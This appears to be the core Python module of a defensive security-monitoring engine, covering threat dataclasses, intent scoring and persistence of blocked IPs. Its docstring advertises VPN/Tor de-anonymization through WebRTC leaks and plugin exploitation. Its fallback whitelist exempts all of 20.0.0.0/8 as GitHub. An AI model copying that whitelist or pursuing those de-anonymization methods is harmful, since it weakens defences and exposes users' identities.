"""Battle-Hardened Security AI for PCS System.

Production-grade security monitoring engine with advanced threat detection,
behavioral analysis, and real-time attack prevention.

Threat Detection Capabilities:
- Brute force attack prevention with adaptive thresholds
- Advanced DDoS detection and mitigation
- SQL injection pattern matching (100+ signatures)
- XSS attack detection (multi-vector)
- Directory traversal and LFI/RFI attempts
- Command injection patterns (bash, sh, powershell)
- Smart curl attack detection (allows legitimate API testing, blocks malicious usage)
- LDAP/XML injection detection
- Server-Side Template Injection (SSTI)
- HTTP parameter pollution
- Protocol-level attacks
- Port scanning and reconnaissance
- Bot and automated tool detection
- Credential stuffing detection
- Session hijacking attempts
- API abuse patterns
- Header injection and CRLF attacks

Defense Mechanisms:
- Automatic IP blocking with configurable TTL
- Rate limiting with exponential backoff
- Behavioral anomaly detection
- Intelligent curl usage analysis (regex-based validation)
- Threat intelligence correlation
- Real-time connection dropping
- Geo-blocking capabilities (configurable)
- User-Agent fingerprinting and validation
- Request pattern analysis
- Law enforcement tracking with geolocation data
- Persistent threat logging to disk

VPN/Tor De-Anonymization Techniques (Government-Grade):
- WebRTC IP leak exploitation (STUN/TURN bypass)
- DNS leak detection and triggering
- TCP/IP fingerprinting and timing analysis
- Browser fingerprinting (Canvas, WebGL, AudioContext)
- JavaScript-based IP revelation payloads
- Flash/Java plugin exploitation (legacy)
- HTTP header manipulation for tracking
- Multi-vector side-channel attacks
- Cryptographic timing analysis
- Network latency fingerprinting
- Real IP extraction from encrypted tunnels
"""

from __future__ import annotations

# Fix Windows console emoji encoding issues
import sys
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

import json
import os
import urllib.request
import urllib.error
import hashlib
import secrets
import pickle
import warnings
import ipaddress
import logging
import time
try:
    import fcntl  # File locking for thread-safe JSON writes (Linux/Unix only)
    FCNTL_AVAILABLE = True
except ImportError:
    FCNTL_AVAILABLE = False
    print("[WARNING] fcntl not available (Windows) - file locking disabled")
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from enum import Enum
from typing import List, Dict, Optional, Tuple
from collections import defaultdict

# Initialize logger
logger = logging.getLogger(__name__)

# Machine Learning / Real AI imports
try:
    import numpy as np
    from sklearn.ensemble import IsolationForest, RandomForestClassifier, GradientBoostingClassifier
    from sklearn.preprocessing import StandardScaler
    from sklearn.cluster import DBSCAN
    import joblib
    ML_AVAILABLE = True
    warnings.filterwarnings('ignore', category=UserWarning)
except ImportError:
    ML_AVAILABLE = False
    print("[WARNING] ML libraries not installed. Run: pip install scikit-learn numpy joblib scipy")
    print("[WARNING] Falling back to rule-based security only")

# Deep Learning imports (Phase 2: Autoencoder)
try:
    import tensorflow as tf
    from tensorflow import keras
    from tensorflow.keras import layers, Model
    from tensorflow.keras.optimizers import Adam
    TENSORFLOW_AVAILABLE = True
except ImportError:
    TENSORFLOW_AVAILABLE = False
    logger.warning("[AUTOENCODER] TensorFlow not available - autoencoder disabled")

# Enterprise Threat Intelligence Integration
try:
    from AI.threat_intelligence import threat_intel, honeypot, start_threat_intelligence_engine
    from AI.enterprise_integration import (
        siem_integration, enterprise_api, start_enterprise_integration,
        SecurityEventFormatter
    )
    ENTERPRISE_FEATURES_AVAILABLE = True
    print("[ENTERPRISE] Threat Intelligence and Enterprise Integration modules loaded")
except ImportError as e:
    ENTERPRISE_FEATURES_AVAILABLE = False
    print(f"[WARNING] Enterprise features not available: {e}")
    print("[INFO] System will run in standard mode without external threat intelligence")

# Advanced AI Modules (Phase 1A, 1B, Phase 3)
try:
    from AI.behavioral_heuristics import get_behavioral_heuristics, track_connection
    from AI.sequence_analyzer import get_sequence_analyzer, observe_event
    from AI.drift_detector import get_drift_detector, update_baseline, track_features
    ADVANCED_AI_AVAILABLE = True
    print("[ADVANCED-AI] Behavioral Heuristics, LSTM Sequence Analyzer, and Drift Detector loaded")
except ImportError as e:
    ADVANCED_AI_AVAILABLE = False
    print(f"[WARNING] Advanced AI modules not available: {e}")
    print("[INFO] Running without behavioral heuristics, sequence analysis, and drift detection")

# Graph Intelligence Module (Phase 4)
try:
    from AI.graph_intelligence import (
        get_graph_intelligence, track_connection as graph_track_connection,
        analyze_lateral_movement, save_graph_data
    )
    GRAPH_INTELLIGENCE_AVAILABLE = True
    print("[GRAPH-AI] Network topology graph intelligence loaded")
except ImportError as e:
    GRAPH_INTELLIGENCE_AVAILABLE = False
    print(f"[WARNING] Graph intelligence not available: {e}")
    print("[INFO] Running without network graph analysis")

# Meta Decision Engine (Phase 5)
try:
    from AI.meta_decision_engine import (
        get_meta_engine, make_decision as ensemble_decision,
        DetectionSignal, SignalType as MetaSignalType, ThreatLevel as MetaThreatLevel
    )
    META_ENGINE_AVAILABLE = True
    print("[META-ENGINE] Ensemble decision engine loaded - 12 signal fusion")
except ImportError as e:
    META_ENGINE_AVAILABLE = False
    print(f"[WARNING] Meta decision engine not available: {e}")
    print("[INFO] Running without ensemble voting")

# Reputation Tracker (Phase 6)
try:
    from AI.reputation_tracker import get_reputation_tracker
    REPUTATION_TRACKER_AVAILABLE = True
    print("[REPUTATION] IP reputation tracking loaded")
except ImportError as e:
    REPUTATION_TRACKER_AVAILABLE = False
    print(f"[WARNING] Reputation tracker not available: {e}")
    print("[INFO] Running without IP reputation scoring")

# Explainability Engine (Phase 7)
try:
    from AI.explainability_engine import get_explainability_engine, create_explanation
    EXPLAINABILITY_AVAILABLE = True
    print("[EXPLAINABILITY] Decision explanation engine loaded")
except ImportError as e:
    EXPLAINABILITY_AVAILABLE = False
    print(f"[WARNING] Explainability engine not available: {e}")
    print("[INFO] Running without AI decision explanations")

# Causal Inference Engine (Layer 19)
try:
    from AI.causal_inference import get_causal_engine, analyze_causality, CausalLabel
    CAUSAL_INFERENCE_AVAILABLE = True
    print("[CAUSAL] Causal inference engine loaded - root cause analysis")
except ImportError as e:
    CAUSAL_INFERENCE_AVAILABLE = False
    print(f"[WARNING] Causal inference engine not available: {e}")
    print("[INFO] Running without causal reasoning")

# Trust Degradation Graph (Layer 20)
try:
    from AI.trust_graph import get_trust_graph, track_entity, get_trust_score, EntityType, TrustState
    TRUST_GRAPH_AVAILABLE = True
    print("[TRUST-GRAPH] Trust degradation tracking loaded - persistent entity trust")
except ImportError as e:
    TRUST_GRAPH_AVAILABLE = False
    print(f"[WARNING] Trust graph not available: {e}")
    print("[INFO] Running without trust degradation tracking")

# Step 21 Semantic Execution-Denial Gate (Layer 21, policy-driven)
try:
    from AI.step21_gate import evaluate_step21 as step21_evaluate_request
    STEP21_AVAILABLE = True
    print("[STEP21] Policy-driven semantic execution-denial gate loaded - post-ensemble semantic check")
except ImportError as e:
    STEP21_AVAILABLE = False
    print(f"[WARNING] Step 21 gate not available: {e}")
    print("[INFO] Running without semantic execution-denial gate (20-layer mode)")

# Advanced Orchestration (Phase 8)
try:
    from AI.advanced_orchestration import get_orchestrator
    ORCHESTRATION_AVAILABLE = True
    print("[ORCHESTRATION] Advanced workflow orchestration loaded")
except ImportError as e:
    ORCHESTRATION_AVAILABLE = False
    print(f"[WARNING] Orchestration not available: {e}")
    print("[INFO] Running without advanced orchestration")

# Kernel Telemetry (Module A)
try:
    from AI.kernel_telemetry import get_kernel_telemetry
    KERNEL_TELEMETRY_AVAILABLE = True
    print("[KERNEL-TELEMETRY] Deep packet inspection loaded")
except ImportError as e:
    KERNEL_TELEMETRY_AVAILABLE = False
    print(f"[WARNING] Kernel telemetry not available: {e}")
    print("[INFO] Running without kernel-level telemetry")

# Performance Monitoring and Visualization
try:
    import AI.network_performance as network_performance
    import AI.compliance_reporting as compliance_reporting
    import AI.advanced_visualization as advanced_visualization
    ADVANCED_FEATURES_AVAILABLE = True
    print("[ADVANCED] Performance monitoring, compliance reporting, and visualization modules loaded")
except ImportError as e:
    ADVANCED_FEATURES_AVAILABLE = False
    print(f"[WARNING] Advanced features not available: {e}")

# Peer-to-Peer Threat Sharing
try:
    from AI.p2p_sync import get_p2p_sync, sync_threat, start_p2p_sync, get_p2p_status, get_peer_threats
    P2P_SYNC_AVAILABLE = True
    print("[P2P] Peer-to-peer sync module loaded - all containers share threats equally")
except ImportError as e:
    P2P_SYNC_AVAILABLE = False
    print(f"[INFO] P2P sync not available: {e}")
    print("[INFO] Running standalone (no peer threat sharing)")

# Relay Client (WebSocket-based global mesh)
try:
    from AI.relay_client import relay_threat, get_relay_status
    RELAY_AVAILABLE = True
    print("[RELAY] WebSocket relay client loaded - unlimited global peers")
except ImportError as e:
    RELAY_AVAILABLE = False
    print(f"[INFO] Relay client not available: {e}")
    print("[INFO] P2P mesh limited to direct connections")

# Secure deployment helpers (Phase 4)
try:
    from AI.secure_deployment import get_security_domain_label
    SECURE_DEPLOYMENT_AVAILABLE = True
except Exception:
    SECURE_DEPLOYMENT_AVAILABLE = False

# False Positive Filter (5-Gate Pipeline)
try:
    from AI.false_positive_filter import (
        get_filter, create_signal, assess_threat,
        SignalType as FPFilterSignalType, ThreatSignal, ConfidenceScore
    )
    FP_FILTER_AVAILABLE = True
    print("[FP-FILTER] 5-Gate False Positive Elimination Pipeline loaded")
    print("[FP-FILTER] No single signal confirms attack - requires multi-gate validation")
except ImportError as e:
    FP_FILTER_AVAILABLE = False
    print(f"[INFO] False positive filter not available: {e}")
    print("[INFO] Using legacy single-signal detection")

# Node Fingerprinting & Feature Normalization (solves Problem 2: Feature Consistency)
try:
    from AI.node_fingerprint import get_node_fingerprint
    NODE_FP_AVAILABLE = True
    node_fp = get_node_fingerprint()
    print(f"[NODE-FP] {node_fp.get_summary()}")
    print("[NODE-FP] Feature normalization enabled - compatible with similar nodes only")
except ImportError as e:
    NODE_FP_AVAILABLE = False
    print(f"[INFO] Node fingerprinting not available: {e}")
    print("[INFO] Feature consistency across nodes not guaranteed")


class ThreatLevel(str, Enum):
    SAFE = "SAFE"
    INFO = "INFO"
    WARNING = "WARNING"
    SUSPICIOUS = "SUSPICIOUS"
    DANGEROUS = "DANGEROUS"
    CRITICAL = "CRITICAL"


class ResponseLevel(str, Enum):
    """High-level response policy level derived from assessment.

    This is an explicit, human-readable policy abstraction over the
    lower-level threat level + should_block combination. It does NOT
    change behavior; it only exposes the intent of the response.
    """

    OBSERVE = "OBSERVE"   # Log-only, essentially safe
    MONITOR = "MONITOR"   # Elevated monitoring, no active restriction
    RESTRICT = "RESTRICT" # Throttle/rate-limit/contain
    BLOCK = "BLOCK"       # Hard block / connection drop


@dataclass
class SecurityAssessment:
    level: ThreatLevel
    threats: list[str]
    should_block: bool
    ip_address: str
    # Optional rich context for SOCs, auditors, and dashboards
    evidence: Optional[List["EvidenceEvent"]] = None
    intent_snapshot: Optional["IntentSnapshot"] = None
    response_level: Optional[ResponseLevel] = None
    # Evaluation/shadow-mode metadata (non-blocking testing)
    evaluation_mode: bool = False
    would_block_in_strict_mode: Optional[bool] = None


@dataclass
class ActorKey:
    """Stable, privacy-preserving attacker identity.

    ActorKey is derived from multiple semi-stable signals (IP, headers, user-agent
    fingerprint) and hashed into an opaque identifier. It is designed to be used
    consistently across trust graph, reputation, and evidence aggregation without
    exposing raw identifiers.
    """
    id: str
    source_ip: str
    user_agent_hash: str
    forwarded_for: Optional[str] = None


@dataclass
class EvidenceEvent:
    """Unified evidence representation emitted by detection layers.

    This does not change detection behavior; it standardizes how signals are
    recorded so higher-level components (intent engine, auditors, dashboards)
    can reason over a single evidence language.
    """
    actor_id: str
    source_ip: str
    behavior_type: str
    signal_type: str
    is_threat: bool
    confidence: float
    severity: str
    endpoint: str
    method: str
    mitre_techniques: List[str]
    timestamp: str
    proof_ref: Optional[str] = None
    raw_signal: Optional[Dict] = None


# Persistent storage paths - Universal path resolution
import os
from AI.path_helper import (
    get_threat_log_file,
    get_blocked_ips_file,
    get_whitelist_file,
    get_tracking_data_file,
    get_peer_threats_file,
    get_ml_training_file,
    get_ml_metrics_file
)

_THREAT_LOG_FILE = get_threat_log_file()
_BLOCKED_IPS_FILE = get_blocked_ips_file()
_WHITELIST_FILE = get_whitelist_file()
_TRACKING_DATA_FILE = get_tracking_data_file()
_PEER_THREATS_FILE = get_peer_threats_file()
_ML_TRAINING_FILE = get_ml_training_file()
_ML_METRICS_FILE = get_ml_metrics_file()

# Lightweight, read-mostly caches for DNS/TLS anonymization metrics used by
# the Layer 11 VPN/Tor composite signal. These metrics are written by
# AI/dns_analyzer.py and AI/tls_fingerprint.py into the same JSON directory
# that the server exposes via /api/dns/stats and /api/traffic/analysis.
_DNS_TLS_CACHE_TTL_SECONDS = 30.0
_dns_metrics_cache: dict | None = None
_dns_metrics_last_load: float | None = None
_tls_metrics_cache: dict | None = None
_tls_metrics_last_load: float | None = None

# Built-in whitelist for localhost/development (never block these IPs)
# Runtime/persisted whitelist entries are loaded from disk and merged on startup.
_WHITELISTED_IPS = {
    # Localhost variants
    "127.0.0.1", "localhost", "::1",
}

# GitHub IP ranges (cached, refreshed periodically)
_GITHUB_IP_RANGES: List[ipaddress.IPv4Network | ipaddress.IPv6Network] = []
_GITHUB_IP_LAST_FETCH: Optional[datetime] = None

# In-memory threat tracking (in production, use Redis or database)
_failed_login_tracker: Dict[str, List[datetime]] = defaultdict(list)
_request_tracker: Dict[str, List[datetime]] = defaultdict(list)
_blocked_ips: set[str] = set()
_threat_log: List[Dict] = []  # Log of LOCAL security events (shown on dashboard)
_peer_threats: List[Dict] = []  # Log of PEER threats (private, AI training only)

# DPI Monitoring Configuration - Monitor all network devices
_DPI_ENABLED = os.getenv('DPI_MONITORING_ENABLED', 'true').lower() == 'true'
_BLOCK_INTERNAL_THREATS = os.getenv('BLOCK_INTERNAL_THREATS', 'false').lower() == 'true'  # Set to 'true' to block internal IPs
_GEOLOCATION_ENABLED = os.getenv('GEOLOCATION_ENABLED', 'true').lower() == 'true'
_EVALUATION_SHADOW_MODE = os.getenv('BHAI_EVALUATION_SHADOW_MODE', 'false').lower() == 'true'

# Advanced defensive tracking for VPN/Tor/Proxy detection
_fingerprint_tracker: Dict[str, Dict] = {}  # Browser/client fingerprints
_behavioral_signatures: Dict[str, List[Dict]] = defaultdict(list)  # Behavioral patterns
_proxy_chain_tracker: Dict[str, List[str]] = defaultdict(list)  # Track proxy chains
_real_ip_correlation: Dict[str, set] = defaultdict(set)  # Link VPN IPs to real IPs
_honeypot_beacons: Dict[str, Dict] = {}  # Tracking beacons for attacker identification

# Minimal in-memory intent tracking (can be replaced by Redis/DB in production)
_intent_memory: Dict[str, Dict] = {}

# Lightweight in-memory counters for per-layer detection statistics.
# These are used for observability only (e.g., dashboard Section 4) and do
# not influence any enforcement logic.
_signal_detection_counts: Dict[str, int] = defaultdict(int)
_step21_block_count: int = 0


@dataclass
class IntentSnapshot:
    """Lightweight view of an actor's recent intent/state.

    This is derived from EvidenceEvent sequences and stored in-memory
    for now. It is intentionally simple and read-only from the
    enforcement perspective.
    """

    actor_id: str
    total_events: int
    total_threat_events: int
    last_event_time: Optional[str]
    last_threat_time: Optional[str]
    dominant_behavior: Optional[str]
    intent_score: float
    intent_phase: str


class IntentMemoryStore:
    """Minimal in-memory intent store keyed by ActorKey.id.

    In production this can be swapped to Redis/DB, but the interface
    stays the same. It aggregates evidence over time without
    influencing enforcement logic directly.
    """

    def __init__(self) -> None:
        # Reuse existing global dict so other components can inspect it
        self._store: Dict[str, Dict] = _intent_memory

    def update(self, actor: ActorKey, events: List[EvidenceEvent]) -> IntentSnapshot:
        if not events:
            # Ensure the actor at least has an empty state
            state = self._store.get(actor.id, {
                "total_events": 0,
                "total_threat_events": 0,
                "behavior_counts": {},
                "last_event_time": None,
                "last_threat_time": None,
            })
            self._store[actor.id] = state
            return IntentSnapshot(
                actor_id=actor.id,
                total_events=state["total_events"],
                total_threat_events=state["total_threat_events"],
                last_event_time=state["last_event_time"],
                last_threat_time=state["last_threat_time"],
                dominant_behavior=None,
                intent_score=0.0,
                intent_phase="unknown",
            )

        state = self._store.get(actor.id, {
            "total_events": 0,
            "total_threat_events": 0,
            "behavior_counts": {},
            "last_event_time": None,
            "last_threat_time": None,
        })

        behavior_counts: Dict[str, int] = state.get("behavior_counts", {})

        last_event_time = state.get("last_event_time")
        last_threat_time = state.get("last_threat_time")

        for ev in events:
            state["total_events"] += 1
            behavior_counts[ev.behavior_type] = behavior_counts.get(ev.behavior_type, 0) + 1
            last_event_time = ev.timestamp
            if ev.is_threat:
                state["total_threat_events"] += 1
                last_threat_time = ev.timestamp

        state["behavior_counts"] = behavior_counts
        state["last_event_time"] = last_event_time
        state["last_threat_time"] = last_threat_time

        # Simple intent scoring: weighted ratio of threat events
        total_events = max(1, state["total_events"])
        total_threat_events = state["total_threat_events"]
        base_score = min(1.0, total_threat_events / total_events)

        # Heavier weight if dominant behavior is clearly malicious domain
        dominant_behavior = None
        if behavior_counts:
            dominant_behavior = max(behavior_counts.items(), key=lambda kv: kv[1])[0]
            if dominant_behavior in {"honeypot", "anomaly_detection", "ml_classification", "reputation", "causal_inference"}:
                base_score = min(1.0, base_score * 1.2)

        # Map score to coarse-grained phase labels
        if total_threat_events == 0:
            phase = "benign_or_background"
        elif base_score < 0.3:
            phase = "probing_or_reconnaissance"
        elif base_score < 0.7:
            phase = "active_exploitation"
        else:
            phase = "sustained_attack"

        snapshot = IntentSnapshot(
            actor_id=actor.id,
            total_events=total_events,
            total_threat_events=total_threat_events,
            last_event_time=last_event_time,
            last_threat_time=last_threat_time,
            dominant_behavior=dominant_behavior,
            intent_score=base_score,
            intent_phase=phase,
        )

        self._store[actor.id] = {
            "total_events": total_events,
            "total_threat_events": total_threat_events,
            "behavior_counts": behavior_counts,
            "last_event_time": last_event_time,
            "last_threat_time": last_threat_time,
            "last_snapshot": snapshot,
        }

        return snapshot


_intent_store = IntentMemoryStore()


# Helper function to get current time in configured timezone
def _get_current_time():
    """Get current datetime in configured timezone from .env"""
    # Use UTC as standard library datetime.timezone provides timezone.utc
    # For production: integrate with system timezone or zoneinfo for IANA timezones
    return datetime.now(timezone.utc)


def _record_signal_detection(signal_type: "SignalType") -> None:
    """Increment detection counter for a given meta-engine signal type.

    This is side-effect-only accounting for dashboards; it must never
    alter detection or blocking behavior.
    """

    try:
        key = getattr(signal_type, "name", None) or getattr(signal_type, "value", None) or str(signal_type)
        _signal_detection_counts[key] += 1
    except Exception as e:
        # Accounting failure must never impact enforcement
        logger.debug(f"[METRICS] Failed to record signal detection: {e}")


def _record_step21_block() -> None:
    """Increment counter when Step 21 semantic gate vetoes execution."""

    global _step21_block_count
    try:
        _step21_block_count += 1
    except Exception as e:
        logger.debug(f"[METRICS] Failed to record Step21 block: {e}")


def _derive_response_level(level: ThreatLevel, should_block: bool) -> ResponseLevel:
    """Map internal threat level + block decision to high-level response.

    This is a pure function and does not change any behavior; it only
    exposes how aggressive the current response is for observability
    and policy discussions.
    """

    if should_block:
        return ResponseLevel.BLOCK
    if level in {ThreatLevel.CRITICAL, ThreatLevel.DANGEROUS}:
        return ResponseLevel.RESTRICT
    if level in {ThreatLevel.SUSPICIOUS, ThreatLevel.WARNING}:
        return ResponseLevel.MONITOR
    return ResponseLevel.OBSERVE


def _finalize_assessment(
    assessment: SecurityAssessment,
    actor_key: Optional[ActorKey],
    evidence_events: List[EvidenceEvent],
) -> SecurityAssessment:
    """Attach evidence/intent metadata and apply evaluation/shadow mode.

    This helper is used only by the main HTTP assessment path to enrich
    SecurityAssessment instances with:
    - evidence events (for dashboards/auditors),
    - per-actor intent snapshot from IntentMemoryStore,
    - derived ResponseLevel,
    - optional evaluation/shadow mode behavior (non-blocking testing).
    """

    try:
        assessment.evidence = list(evidence_events) if evidence_events else []

        snapshot: Optional[IntentSnapshot] = None
        if actor_key is not None and evidence_events:
            try:
                snapshot = _intent_store.update(actor_key, evidence_events)
            except Exception as e:
                logger.warning(f"[INTENT] Failed to update intent memory: {e}")
        assessment.intent_snapshot = snapshot

        # Always expose a response level for easier policy reasoning
        try:
            assessment.response_level = _derive_response_level(assessment.level, assessment.should_block)
        except Exception as e:
            logger.warning(f"[POLICY] Failed to derive response level: {e}")

        # Evaluation/shadow mode: do NOT change defaults unless explicitly enabled
        if _EVALUATION_SHADOW_MODE:
            # Preserve what strict mode would have done
            assessment.would_block_in_strict_mode = assessment.should_block
            # Force non-blocking behavior while in evaluation mode
            assessment.should_block = False
            assessment.evaluation_mode = True

    except Exception as e:
        logger.warning(f"[ASSESSMENT] Failed to finalize assessment: {e}")

    return assessment


def _build_actor_key(ip_address: str, user_agent: str, headers: Optional[Dict] = None) -> ActorKey:
    """Derive a stable, privacy-preserving ActorKey for an entity.

    Combines source IP, User-Agent, and forwarding headers into a hashed identifier.
    This avoids leaking raw identifiers while allowing consistent tracking across
    sessions and signals.
    """
    headers = headers or {}
    ua = user_agent or ""
    ua_hash = hashlib.sha256(ua.encode("utf-8", errors="ignore")).hexdigest()
    fwd = headers.get("X-Forwarded-For") or headers.get("x-forwarded-for")

    key_material = {
        "ip": ip_address,
        "ua_hash": ua_hash,
        "xff": (fwd.split(",")[0].strip() if isinstance(fwd, str) and fwd else None),
    }
    actor_id = hashlib.sha256(json.dumps(key_material, sort_keys=True).encode("utf-8")).hexdigest()
    return ActorKey(
        id=actor_id,
        source_ip=ip_address,
        user_agent_hash=ua_hash,
        forwarded_for=key_material["xff"],
    )

# ============================================================================
# REAL AI/ML MODELS - Machine Learning Security Intelligence
# ============================================================================

# ML Model storage paths - Universal path resolution
from AI.path_helper import get_ml_models_dir, get_ml_model_file
_ML_MODELS_DIR = get_ml_models_dir()
_ANOMALY_MODEL_FILE = get_ml_model_file("anomaly_detector.pkl")
_THREAT_CLASSIFIER_FILE = get_ml_model_file("threat_classifier.pkl")
_IP_REPUTATION_FILE = get_ml_model_file("ip_reputation.pkl")
_SCALER_FILE = get_ml_model_file("feature_scaler.pkl")

# ML Models (initialized lazily)
_anomaly_detector = None  # IsolationForest for zero-day attack detection
_threat_classifier = None  # RandomForest for multi-class threat classification
_ip_reputation_model = None  # GradientBoosting for IP reputation scoring
_feature_scaler = None  # StandardScaler for feature normalization
_ml_training_data = []  # Training data buffer
_ml_last_trained = None  # Last training timestamp
_ml_prediction_cache = {}  # Cache for ML predictions

# ML Feature extraction tracking
_request_features: Dict[str, List[np.ndarray]] = defaultdict(list) if ML_AVAILABLE else defaultdict(list)
_attack_labels: Dict[str, str] = {}  # Ground truth labels for supervised learning

# Time-weighted training configuration
_THREAT_LOG_MAX_AGE_DAYS = 90  # Keep only last 90 days
_TIME_WEIGHT_DECAY_DAYS = 30  # Exponential decay period (threats lose 50% weight every 30 days)
_RECENT_THREAT_MULTIPLIER = 10.0  # Recent threats (< 7 days) weighted 10x higher

# Enterprise ML Features - Performance Tracking
_ml_performance_metrics = {
    "predictions_made": 0,
    "true_positives": 0,
    "false_positives": 0,
    "true_negatives": 0,
    "false_negatives": 0,
    "precision": 0.0,
    "recall": 0.0,
    "f1_score": 0.0,
    "accuracy": 0.0
}

# Ensemble Voting - Combine multiple model predictions
_ensemble_weights = {
    "anomaly_detector": 0.35,
    "threat_classifier": 0.40,
    "ip_reputation": 0.25
}

# Adaptive Thresholds - Learn from feedback
_adaptive_thresholds = {
    "anomaly_score": -0.5,  # IsolationForest threshold
    "threat_confidence": 0.7,  # Classification confidence
    "reputation_score": 0.7,  # IP reputation threshold
    "ensemble_threshold": 0.65  # Combined prediction threshold
}

# Feature Importance Tracking
_feature_importance_cache = {}


def _save_threat_log() -> None:
    """Save threat log to persistent storage with file locking and auto-rotation at 1GB."""
    try:
        os.makedirs(os.path.dirname(_THREAT_LOG_FILE) or ".", exist_ok=True)
        
        # Check if rotation is needed (1GB limit for ML training logs)
        try:
            from file_rotation import rotate_if_needed
            rotate_if_needed(_THREAT_LOG_FILE)
        except ImportError:
            pass  # Graceful degradation if file_rotation module not available
        except Exception as e:
            print(f"[WARNING] File rotation check failed: {e}")
        
        with open(_THREAT_LOG_FILE, 'w') as f:
            # Acquire exclusive lock to prevent race conditions (Linux/Unix only)
            if FCNTL_AVAILABLE:
                fcntl.flock(f.fileno(), fcntl.LOCK_EX)
            try:
                json.dump(_threat_log, f, indent=2)
            finally:
                if FCNTL_AVAILABLE:
                    fcntl.flock(f.fileno(), fcntl.LOCK_UN)
    except Exception as e:
        print(f"[WARNING] Failed to save threat log: {e}")


def _save_blocked_ips() -> None:
    """Save blocked IPs to persistent storage - UNIFIED FORMAT with honeypot."""
    try:
        os.makedirs(os.path.dirname(_BLOCKED_IPS_FILE) or ".", exist_ok=True)
        
        # Load existing data to preserve metadata from honeypot
        blocked_data = {'blocked_ips': []}
        if os.path.exists(_BLOCKED_IPS_FILE):
            try:
                with open(_BLOCKED_IPS_FILE, 'r') as f:
                    blocked_data = json.load(f)
                    # Handle old format (simple list)
                    if isinstance(blocked_data, list):
                        blocked_data = {'blocked_ips': [{'ip': ip, 'timestamp': _get_current_time().isoformat(), 'reason': 'Legacy block'} for ip in blocked_data]}
            except:
                pass
        
        # Index existing entries by IP so we can preserve metadata
        existing_entries: Dict[str, Dict] = {}
        for entry in blocked_data.get('blocked_ips', []):
            ip = entry.get('ip')
            if ip:
                existing_entries[ip] = entry

        # Rebuild list to match current _blocked_ips exactly
        new_blocked_list: list[Dict] = []
        for ip in sorted(_blocked_ips):
            if ip in existing_entries:
                # Keep existing metadata for still-blocked IPs
                new_blocked_list.append(existing_entries[ip])
            else:
                # New block: add fresh metadata
                new_blocked_list.append({
                    'ip': ip,
                    'timestamp': _get_current_time().isoformat(),
                    'reason': 'Threat detection by AI engine'
                })

        blocked_data['blocked_ips'] = new_blocked_list
        
        # Save unified format
        with open(_BLOCKED_IPS_FILE, 'w') as f:
            json.dump(blocked_data, f, indent=2)
            
    except Exception as e:
        print(f"[WARNING] Failed to save blocked IPs: {e}")


def _fetch_github_ip_ranges() -> None:
    """Fetch GitHub's IP ranges from their API and cache them."""
    global _GITHUB_IP_RANGES, _GITHUB_IP_LAST_FETCH
    
    try:
        # Fetch from GitHub's official meta API
        url = "https://api.github.com/meta"
        req = urllib.request.Request(url, headers={'User-Agent': 'Enterprise-Security-System'})
        
        with urllib.request.urlopen(req, timeout=5) as response:
            data = json.loads(response.read().decode('utf-8'))
            
            # Combine all GitHub IP ranges
            ip_ranges = []
            for key in ['hooks', 'web', 'api', 'git', 'packages', 'pages', 'importer', 'actions']:
                if key in data:
                    ip_ranges.extend(data[key])
            
            # Parse into IP network objects
            _GITHUB_IP_RANGES = []
            for ip_range in set(ip_ranges):  # Remove duplicates
                try:
                    _GITHUB_IP_RANGES.append(ipaddress.ip_network(ip_range, strict=False))
                except ValueError:
                    pass
            
            _GITHUB_IP_LAST_FETCH = datetime.now(timezone.utc)
            print(f"[WHITELIST] ✅ Loaded {len(_GITHUB_IP_RANGES)} GitHub IP ranges")
            
    except Exception as e:
        print(f"[WARNING] Failed to fetch GitHub IP ranges: {e}")
        # Fallback to common GitHub ranges if API fails
        fallback_ranges = [
            "140.82.112.0/20",  # GitHub main
            "143.55.64.0/20",
            "185.199.108.0/22",
            "192.30.252.0/22",
            "20.0.0.0/8",  # Azure (GitHub uses Azure)
        ]
        _GITHUB_IP_RANGES = [ipaddress.ip_network(r, strict=False) for r in fallback_ranges]
        print(f"[WHITELIST] Using fallback GitHub IP ranges ({len(_GITHUB_IP_RANGES)} ranges)")


def _is_github_ip(ip_address: str) -> bool:
    """Check if an IP address belongs to GitHub."""
    global _GITHUB_IP_RANGES, _GITHUB_IP_LAST_FETCH
    
    # Refresh GitHub IP ranges every 24 hours
    if not _GITHUB_IP_RANGES or not _GITHUB_IP_LAST_FETCH or \
       (datetime.now(timezone.utc) - _GITHUB_IP_LAST_FETCH) > timedelta(hours=24):
        _fetch_github_ip_ranges()
    
    try:
        ip = ipaddress.ip_address(ip_address)
        for network in _GITHUB_IP_RANGES:
            if ip in network:
                return True
    except ValueError:
        pass
    
    return False


def _save_whitelist() -> None:
    """Save whitelisted IPs to persistent storage."""
    try:
        os.makedirs(os.path.dirname(_WHITELIST_FILE) or ".", exist_ok=True)
        # Remove default IPs before saving
        persistent_whitelist = _WHITELISTED_IPS - {"127.0.0.1", "localhost", "::1"}
        with open(_WHITELIST_FILE, 'w') as f:
            json.dump(list(persistent_whitelist), f, indent=2)
    except Exception as e:
        print(f"[WARNING] Failed to save whitelist: {e}")


def _save_tracking_data() -> None:
    """Save brute force, rate limiting, and fingerprinting data."""
    try:
        os.makedirs(os.path.dirname(_TRACKING_DATA_FILE) or ".", exist_ok=True)
        tracking_data = {
            'failed_login_tracker': {
                ip: [ts.isoformat() for ts in timestamps]
                for ip, timestamps in _failed_login_tracker.items()
            },
            'request_tracker': {
                ip: [ts.isoformat() for ts in timestamps]
                for ip, timestamps in _request_tracker.items()
            },
            'fingerprint_tracker': dict(_fingerprint_tracker),
            'behavioral_signatures': dict(_behavioral_signatures),
            'proxy_chain_tracker': dict(_proxy_chain_tracker),
            'real_ip_correlation': {ip: list(real_ips) for ip, real_ips in _real_ip_correlation.items()},
            'honeypot_beacons': dict(_honeypot_beacons)
        }
        with open(_TRACKING_DATA_FILE, 'w') as f:
            json.dump(tracking_data, f, indent=2)
    except Exception as e:
        print(f"[WARNING] Failed to save tracking data: {e}")


def _save_peer_threats() -> None:
    """Save P2P peer threat intelligence."""
    try:
        os.makedirs(os.path.dirname(_PEER_THREATS_FILE) or ".", exist_ok=True)
        with open(_PEER_THREATS_FILE, 'w') as f:
            json.dump(_peer_threats, f, indent=2)
    except Exception as e:
        print(f"[WARNING] Failed to save peer threats: {e}")


def _save_ml_training_data() -> None:
    """Save ML training data buffer."""
    try:
        os.makedirs(os.path.dirname(_ML_TRAINING_FILE) or ".", exist_ok=True)
        # Convert numpy arrays to lists if present
